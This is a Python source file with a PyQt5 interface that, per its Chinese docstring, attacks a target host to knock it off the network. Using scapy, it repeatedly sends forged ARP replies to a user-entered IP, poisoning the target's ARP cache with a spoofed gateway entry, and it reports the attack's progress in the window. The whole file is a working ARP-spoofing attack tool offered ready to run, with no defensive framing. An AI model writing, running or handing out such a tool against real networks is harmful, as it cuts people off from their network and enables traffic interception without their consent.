# ---------- encoding：UTF-8 ------------
# author:liu     time:2021/3/7
# ---------- encoding：UTF-8 ------------
# author:liu     time:2021/3/7

"""
本程序目的攻击目标主机，实现断网
"""
from PyQt5.QtWidgets import *
from PyQt5.QtCore import QThread, pyqtSignal, QObject
from PyQt5 import uic
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, get_if_hwaddr, getmacbyip
import netifaces  # 这个获取本机的所有网关，接口interface
import time

# 本机IP地址和本机Mac地址
local_ip = ARP().psrc
local_mac = ARP().hwsrc
print(local_ip + ' + ' + local_mac)

# 获取网关地址和mac地址
gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
gateway_mac = getmacbyip(gateway_ip)
print(gateway_ip + ' + ' + gateway_mac)


# a = getmacbyip('10.12.11.40')
# print(a)

class myThread(QThread):
    s1 = pyqtSignal(str)

    def __init__(self, ip=None):
        super(myThread, self).__init__()
        self.flag = True
        self.target_ip = ip

    def run(self):
        print('3333333')
        try:
            while self.flag:
                print('44444444')
                arp = arp_pkt(gateway_ip, gateway_mac, self.target_ip, getmacbyip(self.target_ip))
                send(arp)
                self.s1.emit('[*****]正在arp攻击[*****]')
                time.sleep(2)
            self.s1.emit("[*****]arp攻击结束[*****]")
        except Exception as e:
            print(e)

    def stop(self):
        self.flag = False


def arp_pkt(gateway_ip, gateway_mac, target_ip, target_mac):
    print('2222222')
    poison_target = ARP()
    poison_target.op = 2  # 1是请求，2是响应
    poison_target.hwsrc = gateway_mac  # 默认指向本机地址
    poison_target.psrc = gateway_ip

    poison_target.hwdst = target_mac
    poison_target.pdst = target_ip

    return poison_target


class Attack(QWidget):
    stop_singnal = pyqtSignal()

    def __init__(self):
        super(Attack, self).__init__()
        self.ui = uic.loadUi("../ui/attack1.ui")
        self.ui.show()
        self.thread = None

        self.connector()

    # 信号与槽连接
    def connector(self):
        self.ui.buttonAttack.clicked.connect(lambda: self.startOrstop("start"))
        self.ui.buttonStop.clicked.connect(lambda: self.startOrstop("stop"))

    def startOrstop(self, text):
        try:
            print('111111')
            tip = self.ui.lineEdit.text()
            print(tip)
            # myThread1 = myThread()  # 子线程去停止
            # self.stop_singnal.connect(myThread1.stop)

            if text == "start":
                print('开始')
                self.thread = myThread(ip=tip)  # 创建主线程
                self.thread.start()  # 执行run函数
                self.thread.s1.connect(self.display_message)
            elif text == "stop":
                print('结束')
                self.stop_singnal.connect(self.thread.stop)
                self.stop_singnal.emit()

        except Exception as e:
            print(e)

    def display_message(self, message):
        self.ui.textEdit.setText(message)


if __name__ == '__main__':
    app = QApplication([])

    attack = Attack()

    app.exec_()
